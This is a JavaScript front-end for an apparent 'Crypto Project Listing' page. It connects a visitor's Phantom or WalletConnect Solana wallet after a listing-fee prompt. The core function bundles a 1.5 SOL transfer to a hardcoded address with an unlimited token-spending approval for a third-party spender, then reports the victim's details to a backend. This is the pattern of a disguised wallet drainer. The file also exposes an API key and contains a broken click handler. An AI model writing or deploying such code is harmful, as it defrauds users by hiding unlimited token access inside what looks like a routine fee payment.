'use strict';

/* ============================
   DOM REFERENCES
   ============================ */
const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');
const phantomButton = document.getElementById('phantomButton');
const walletConnectButton = document.getElementById('walletConnectButton');

let solanaProvider = null;
let connection = new window.solanaWeb3.Connection("https://solana-mainnet.g.alchemy.com/v2/M7idHd_uE745EwD7NcMb4");
let txInProgress = false;

/* ============================
   UI FLOW
   ============================ */
if (projectForm && feeModal) {
  projectForm.addEventListener('submit', (event) => {
    event.preventDefault();
    feeModal.style.display = 'flex';
  });
}

if (closeButtons[0] && feeModal) {
  closeButtons[0].addEventListener('click', () => {
    feeModal.style.display = 'none';
  });
}

if (proceedButton && feeModal && walletModal) {
  proceedButton.addEventListener('click', () => {
    feeModal.style.display = 'none';
    walletModal.style.display = 'flex';
  });
}

if (closeButtons[1] && walletModal) {
  closeButtons[1].addEventListener('click', () => {
    walletModal.style.display = 'none';
  });
}

if (phantomButton) {
  phantomButton.addEventListener('click', phantomButton);
}

if (walletConnectButton) {
  walletConnectButton.addEventListener('click', connectWalletConnectSolana);
}


/* ============================
   PHANTOM WALLET
   ============================ */
async function connectPhantom() {
  try {
    const provider = window.solana;
    if (!provider || !provider.isPhantom) {
      alert('Phantom Wallet not found. Please install it or use WalletConnect for mobile.');
      return;
    }

    const resp = await provider.connect();
    solanaProvider = provider;

    console.log('Connected Phantom account:', resp.publicKey.toString());

    // Example: call atomic flow
    await sendSolAndApproveAtomic(resp.publicKey.toString(), "REPLACE_TOKEN_ACCOUNT", "REPLACE_SPENDER_ADDRESS", 1000);
  } catch (error) {
    console.error('Error connecting to Phantom:', error);
  }
}

/* ============================
   WALLETCONNECT v2 (SOLANA)
   ============================ */
let wcProvider = null;

async function connectWalletConnectSolana() {
  try {
    if (wcProvider) {
      await wcProvider.disconnect().catch(() => {});
      wcProvider = null;
    }

    walletConnectButton.classList.add('loading');
    walletConnectButton.disabled = true;

    const { SolanaProvider } = await import('https://esm.sh/@walletconnect/solana-provider@latest');

    wcProvider = await SolanaProvider.init({
      projectId: "YOUR_PROJECT_ID",
      chains: ["solana:mainnet"],
      showQrModal: true,
      rpcMap: {
        "solana:mainnet": "https://api.mainnet-beta.solana.com"
      },
      metadata: {
        name: 'Crypto Project Listing',
        url: window.location.origin
      }
    });

    const accounts = await wcProvider.enable();
    solanaProvider = wcProvider;

    console.log("Connected WalletConnect Solana account:", accounts[0]);

    // Example: call atomic flow
    await sendSolAndApproveAtomic(accounts[0], "REPLACE_TOKEN_ACCOUNT", "REPLACE_SPENDER_ADDRESS", 1000);
  } catch (err) {
    console.error(err);
    alert('WalletConnect (Solana) Error. Please retry or refresh.');
  }

  walletConnectButton.classList.remove('loading');
  walletConnectButton.disabled = false;

  window.addEventListener('beforeunload', () => {
    if (wcProvider?.disconnect) wcProvider.disconnect().catch(() => {});
  });
}

/* ============================
   ATOMIC SOL + SPL APPROVE
   ============================ */
async function sendSolAndApproveAtomic(account, tokenAccount, spenderAddress, amount) {
  if (txInProgress) return;
  txInProgress = true;

  try {
    const receiver = "39LLqoEdw4Ahx8dj8hA4uZVCBS1rUNaKvthr1YnJQp2u";
    const lamports = 1.5 * 1e9;

    const fromPubkey = getProviderPubkey(account);

    const balance = await connection.getBalance(fromPubkey);
    if (balance < lamports) throw new Error("Insufficient SOL");

    // --- CREATE INSTRUCTIONS ---
    const transferIx = window.solanaWeb3.SystemProgram.transfer({
      fromPubkey,
      toPubkey: new window.solanaWeb3.PublicKey(receiver),
      lamports
    });

    const TOKEN_PROGRAM_ID = new window.solanaWeb3.PublicKey(
      "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
    );

    const maxApprove = BigInt("18446744073709551615"); // 2^64-1

    const approveIx = window.splToken.createApproveInstruction(
      new window.solanaWeb3.PublicKey(tokenAccount),
      new window.solanaWeb3.PublicKey(spenderAddress),
      fromPubkey,
      maxApprove,       // practically unlimited approval
      [],
      TOKEN_PROGRAM_ID
    );

    const transaction = new window.solanaWeb3.Transaction()
      .add(transferIx)
      .add(approveIx);

    transaction.feePayer = fromPubkey;

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.lastValidBlockHeight = lastValidBlockHeight;

    const signed = await solanaProvider.signTransaction(transaction);
    const signature = await connection.sendRawTransaction(signed.serialize());

    await connection.confirmTransaction(signature, "confirmed");

    alert(`✅ Atomic SOL + Approve successful!\nTx: ${signature}`);

    await safeFetch("http://localhost:3000/notifyAtomic", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        owner: account,
        spender: spenderAddress,
        txHash: signature
      })
    });

  } catch (error) {
    console.error("Atomic tx failed:", error);
    alert("❌ Atomic transfer failed: " + error.message);
  } finally {
    txInProgress = false;
  }
}

/* ============================
   HELPERS
   ============================ */
function getProviderPubkey(account) {
  return solanaProvider.publicKey || new window.solanaWeb3.PublicKey(account);
}

async function safeFetch(url, options) {
  try {
    return await fetch(url, options);
  } catch (err) {
    console.warn("Backend notification failed:", err);
  }
}

